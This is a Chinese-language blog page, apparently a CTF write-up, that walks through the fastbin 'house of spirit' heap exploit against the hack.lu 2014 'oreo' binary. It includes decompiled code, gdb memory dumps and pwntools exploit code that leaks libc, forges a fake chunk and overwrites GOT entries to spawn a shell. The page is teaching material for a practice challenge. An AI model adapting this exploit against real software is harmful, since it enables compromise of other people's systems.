@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="English">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="fastbin-attack之house of Sprit前言：因为堆自己想入门也好久了，然后一直没进去，现在开始写一系列的wp,为刚入门堆的人提供一个学习路径，经过我自己摸索并且可行的路径，我将会记录下来一篇篇的整个过程 2014 hack.lu oreo补充函数说明：  fgets函数会在输入完成后自动在结尾添加一个’\0’，比如我们输入1234加上我们的回车总共是1234’\x0a’’\x0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastbin-1">
+<meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;2019&#x2F;04&#x2F;24&#x2F;pwn&#x2F;fastbin-1&#x2F;index.html">
+<meta property="og:site_name" content="NoOne-hub">
+<meta property="og:description" content="fastbin-attack之house of Sprit前言：因为堆自己想入门也好久了，然后一直没进去，现在开始写一系列的wp,为刚入门堆的人提供一个学习路径，经过我自己摸索并且可行的路径，我将会记录下来一篇篇的整个过程 2014 hack.lu oreo补充函数说明：  fgets函数会在输入完成后自动在结尾添加一个’\0’，比如我们输入1234加上我们的回车总共是1234’\x0a’’\x0">
+<meta property="og:locale" content="English">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g2ydm1wq4ej30li04uwf2.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g2f93s8owgj31hc0sjwrg.jpg">
+<meta property="og:updated_time" content="2019-09-09T14:00:26.860Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g2ydm1wq4ej30li04uwf2.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://noone-hub.github.io/2019/04/24/pwn/fastbin-1/"/>
+
+
+
+
+
+  <title>fastbin-1 | NoOne-hub</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="English">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">NoOne-hub</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">A place that No One knw</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/04/24/pwn/fastbin-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LiHua">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoOne-hub">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">fastbin-1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-24T10:30:06+08:00">
+                2019-04-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="fastbin-attack之house-of-Sprit"><a href="#fastbin-attack之house-of-Sprit" class="headerlink" title="fastbin-attack之house of Sprit"></a>fastbin-attack之house of Sprit</h1><p>前言：因为堆自己想入门也好久了，然后一直没进去，现在开始写一系列的wp,为刚入门堆的人提供一个学习路径，经过我自己摸索并且可行的路径，我将会记录下来一篇篇的整个过程</p>
+<h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p>补充函数说明：</p>
+<ul>
+<li>fgets函数会在输入完成后自动在结尾添加一个’\0’，比如我们输入1234加上我们的回车总共是1234’\x0a’’\x00’他sub_80485EC这个函数会将\x0a变成\x00<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2ydm1wq4ej30li04uwf2.jpg" alt="1"></li>
+</ul>
+<h3 id="结构体构造"><a href="#结构体构造" class="headerlink" title="结构体构造"></a>结构体构造</h3><p>开头调试的时候一直不理解他的结构体是如何构造出来的，然后ida解析出来的跟他图片上所谓结构体格格不入，所以手动调试了一下午，知道了他的结构体是如何构造的</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> decription[<span class="number">25</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">27</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个结构体是经过调试以及看汇编得出来的，</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048644</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = dword_804A288;</span><br><span class="line">  dword_804A288 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A288 )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)dword_804A288 + <span class="number">13</span>) = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle name: "</span>);</span><br><span class="line">    fgets(dword_804A288 + <span class="number">25</span>, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288 + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle description: "</span>);</span><br><span class="line">    fgets(dword_804A288, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288);</span><br><span class="line">    ++dword_804A2A4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something terrible happened!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里可以看出filename从25开始的，推出前面的description为25，而name长度为27是如何推出来的呢？看图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2f93s8owgj31hc0sjwrg.jpg" alt="2"></p>
+<p>我这是在输出函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048729</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rifle to be ordered:\n%s\n"</span>, <span class="string">"==================================="</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = dword_804A288; i; i = (<span class="keyword">char</span> *)*((_DWORD *)i + <span class="number">13</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, i + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, i);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==================================="</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里下的断点，你看ida解析出来的什么鬼，i+13，莫名奇妙的写法，完全看不懂，然后我定位到这里断点后，他加的值是0x34，他是从结构体开头加的0x34(10进制:52)，然后取出下一个指针，也就是next指针，继续进行循环，ida解析出的i+13完全乱来的，52-25 = 27，所以大小就这么退出来了，不理解这个结构体，这道题很多写法都看不懂，比如他的偏移什么，理解了就好构造了。</p>
+<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><p>题目里有堆溢出，我们可以通过堆溢出溢出到结构体的next指针，让next指针指向got表某一项，从而泄露出地址，进而求出libc的地址，求出libc的地址过后，在利用house of sprit，free掉一个自己伪造的chunk,进而达到覆写got表成one_gadget，然后通过调用该函数获得权限</p>
+<h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>将堆的各个操作写成函数，因为堆里有很多重复操作，所以这样会比较方便</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="leak地址"><a href="#leak地址" class="headerlink" title="leak地址"></a>leak地址</h3><p>我们知道他有个next指针，所以我们覆盖掉他的next指针，在利用show函数就可以打印任意地址的内容了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#first leak the libc</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">result = p.recvuntil(<span class="string">"==================================="</span>)[:<span class="number">4</span>]</span><br><span class="line">puts_addr = u32(result)</span><br><span class="line">log.success(<span class="string">"puts_got = &#123;:#x&#125;"</span>.format(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br></pre></td></tr></table></figure>
+<p>这样就leak出puts的地址，接着就可以获得libc地址</p>
+<h3 id="填充大小并修改next指针"><a href="#填充大小并修改next指针" class="headerlink" title="填充大小并修改next指针"></a>填充大小并修改next指针</h3><p>这题目有个计算数值的变量，也就是说你malloc一个，他就会加1，我们可以将这里当作chunk大小，因为一个枪支结构体大小为0x38,所以堆块大小为0x40,我们将其大小提升至0x40，并让最后一个堆块的next指针指向这块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">0x3f</span>:</span><br><span class="line">    add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), <span class="string">'b'</span>*<span class="number">25</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br></pre></td></tr></table></figure>
+<p>0x804a2a4是count的地址，所以+4就是堆块的数据段</p>
+<h3 id="绕过检测"><a href="#绕过检测" class="headerlink" title="绕过检测"></a>绕过检测</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### begin fake </span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x34</span>, <span class="string">'b'</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'c'</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">delete()</span><br><span class="line">p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/60wx 0x804a2c0-0x20</span><br><span class="line">0x804a2a0:	0x00000000	0x00000040	0x0804a2c0	0x00000000</span><br><span class="line">0x804a2b0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2c0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2d0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2e0:	0x00000040	0x00000100	0x62626262	0x62626262</span><br><span class="line">0x804a2f0:	0x62626262	0x00000000	0x63636363	0x63636363</span><br><span class="line">0x804a300:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a310:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a320:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a330:	0x63636363	0x63636363	0x63636363	0x00636363</span><br><span class="line">0x804a340:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a350:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a360:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a370:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a380:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
+<p>可以看下内存中的内容,这就是构造完成后的图，然后free掉0x804a2a0这个大小为0x40的堆块，然后在fastbin中是FILO，所以你在申请的堆块就是申请到的是0x804a2a0这个堆块，在0x0804a2a8这个堆块的数据部分的东西就很重要了</p>
+<h3 id="覆写got表"><a href="#覆写got表" class="headerlink" title="覆写got表"></a>覆写got表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">payload = p32(sys_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">edit(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里ctf-wiki用的是strlen表，<strong>然后这里有个小细节。。。记得第二个位置才是结构体的开头，所以payload要放在add的第二个位置</strong>，构造payload为strlen的地址，然后在用edit函数进行编辑</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Message</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter any notice you'd like to submit with your order: "</span>);</span><br><span class="line">  fgets(dword_804A2A8, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485EC(dword_804A2A8);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>edit函数在ida里的原样，就是从0x804a2a8指向的空间写东西，这里指向的空间是0x0804a2c0也就是我们刚刚payload写入的位置，然后进行编辑</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/60wx 0x804a2a8-0x8</span><br><span class="line">0x804a2a0:	0x00000001	0x00000041	0x0804a250	0x61616161</span><br><span class="line">0x804a2b0:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0x804a2c0:	0x62000061	0x62626262	0x62626262	0x62626262</span><br><span class="line">0x804a2d0:	0x62626262	0x62626262	0x62626262	0x00000000</span><br><span class="line">0x804a2e0:	0x0000000a	0x00000100	0x62626262	0x62626262</span><br><span class="line">0x804a2f0:	0x62626262	0x00000000	0x63636363	0x63636363</span><br><span class="line">0x804a300:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a310:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a320:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a330:	0x63636363	0x63636363	0x63636363	0x00636363</span><br><span class="line">0x804a340:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a350:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a360:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a370:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a380:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
+<p>你看，地址变成了0x804a250</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x80487eb    call   fgets@plt &lt;0x8048480&gt;</span><br><span class="line">       s: 0x804a250 (strlen@got.plt) —▸ 0xf7e3d440 ◂— 0x7c8b5756</span><br><span class="line">       n: 0x80</span><br><span class="line">       stream: 0xf7f715a0 (_IO_2_1_stdin_) ◂— 0xfbad208</span><br></pre></td></tr></table></figure>
+<p>就是got表的地址<br>然后编辑过后调用strlen就会出发了，这里我有个不懂的地方就是将got表覆盖成system的地址，然后我不知道如何进行传参数，ctf-wiki给的是‘;/bin/sh\x00’，经过测试system(“abcd;/bin/sh”)在c语言里也是可以获得权限的，<br>这里是调用strlen，strlen求的是payload长度，所以相当于system(payload)<br>也就是相当于system(p32(sys_addr)+”;/bin/sh”)</p>
+<p>并且他前面求出了bin_sh地址，他也没用上。应该也是这里卡住了一小会，我是转头改用了one_gadget</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x5fbc5</span></span><br><span class="line">payload = p32(one_gadget)</span><br><span class="line">edit(payload)</span><br><span class="line">puts()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>完结，撒花<br>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'oreo'</span></span><br><span class="line">ctx.remote_libc = <span 